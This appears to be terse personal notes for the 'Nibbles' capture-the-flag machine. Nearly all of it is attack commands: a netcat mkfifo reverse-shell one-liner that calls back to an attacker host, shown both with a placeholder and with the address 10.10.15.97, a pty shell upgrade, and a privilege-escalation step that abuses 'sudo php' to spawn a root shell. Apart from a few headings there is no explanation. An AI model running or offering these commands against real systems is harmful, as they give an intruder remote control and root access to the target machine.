## Nibbles
<b>reverse shell</b>
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

<b>To activate shell</b>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.97 9443 >/tmp/f

If we have user access and want to escalate privelages:
```bash
# Try sudo -l
sudo -l

# Otherwise:
shell

# Thereafter:
CMD="/bin/bash" 
sudo php -r "system('/bin/sh');"
```